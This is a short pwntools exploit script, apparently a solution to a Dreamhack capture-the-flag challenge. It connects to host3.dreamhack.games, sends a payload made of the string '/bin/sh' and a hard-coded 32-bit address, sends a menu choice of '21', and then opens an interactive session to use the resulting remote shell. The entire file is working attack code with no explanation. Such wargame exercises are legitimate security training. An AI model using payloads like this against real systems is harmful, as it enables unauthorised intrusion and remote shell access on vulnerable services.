from pwn import *

p = remote("host3.dreamhack.games", 13223)

payload = b'/bin/sh\x00' + b'\xac\xa0\x04\x08'

p.sendline(payload)
p.sendline(b'21')

p.interactive()